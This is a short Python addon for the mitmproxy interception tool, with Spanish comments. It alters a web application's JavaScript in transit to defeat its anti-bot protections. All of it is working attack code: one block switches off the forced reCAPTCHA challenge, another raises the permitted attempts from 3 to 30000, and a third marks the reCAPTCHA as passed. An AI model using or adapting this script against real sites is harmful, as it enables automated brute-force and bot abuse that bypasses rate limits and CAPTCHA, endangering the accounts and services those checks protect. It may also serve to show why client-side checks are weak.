from mitmproxy import http


def response(flow: http.HTTPFlow) -> None:

    """ 
    ##############
    Bloque 1
    ##############
    """
    
    """ 
    Código Javascript que el servidor envía al cliente.
    En este caso particular, la variable "ESROBOT" obliga al usuario hacer "ReCaptcha".
    """
    server_response = b"var ESROBOT = '';"
    
    """
    Nuevo código HTML/JS/etc que reemplazará al original (data tampering)
    """
    tampered_response = b"var ESROBOT = 'no';"
   
    """
    Instrucción para "mitmproxy" que reemplaza código original de forma 'inline'
    """
    flow.response.content = flow.response.content.replace(server_response, tampered_response)
    
    """ 
    ##############
    Bloque 2
    ##############
    """
    server_response = b"var NUMERO_MAX_INTENTOS = 3;"
    tampered_response = b"var NUMERO_MAX_INTENTOS = 30000;"
    flow.response.content = flow.response.content.replace(server_response, tampered_response)
    
    """
    ##############
    Bloque 3
    ##############
    """
    server_response = b"var esrecaptcha = \"False\";"
    tampered_response = b"var esrecaptcha = \"True\";"
    flow.response.content = flow.response.content.replace(server_response, tampered_response)


    
    
